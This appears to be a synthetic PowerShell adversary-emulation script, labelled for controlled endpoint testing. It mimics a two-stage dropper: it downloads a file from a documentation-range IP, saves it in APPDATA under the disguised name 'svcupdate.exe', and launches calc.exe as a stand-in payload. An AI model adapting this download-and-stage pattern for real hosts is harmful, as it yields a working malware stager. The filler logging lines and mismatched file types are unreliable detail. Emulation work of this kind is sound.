
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://192.0.2.140:8080/stage1.ps1',
    [string]$OutputPath = "$env:APPDATA\svcupdate.exe",
    [string]$TracePath = "$env:TEMP\recon.log",
    [int]$ConnectionTimeout = 208
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 208
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    Write-Verbose "Second stage handoff complete"
    return $true
}

Write-Verbose "Starting multi-stage workflow"
$OperationResult = Invoke-Stage1Download -SourceUrl $RemoteUrl -DestinationPath $OutputPath -TimeoutSec $ConnectionTimeout
if ($OperationResult) {
    $HandoffResult = Invoke-Stage2Execution -StagedPath $OutputPath
    Write-Verbose ("Handoff result: " + $HandoffResult)
}
else {
    Write-Warning "First stage did not complete"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $RemoteUrl
    Destination = $OutputPath
    TimeoutSec = $ConnectionTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Write-Verbose "Preparing working directory"
Write-Verbose "Validating result"
Write-Verbose "Reading configuration values"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Inspecting process list"
Write-Verbose "Stage handoff finished"
Write-Verbose "stage marker 33 reached"
Write-Output "stage 7 initialized"
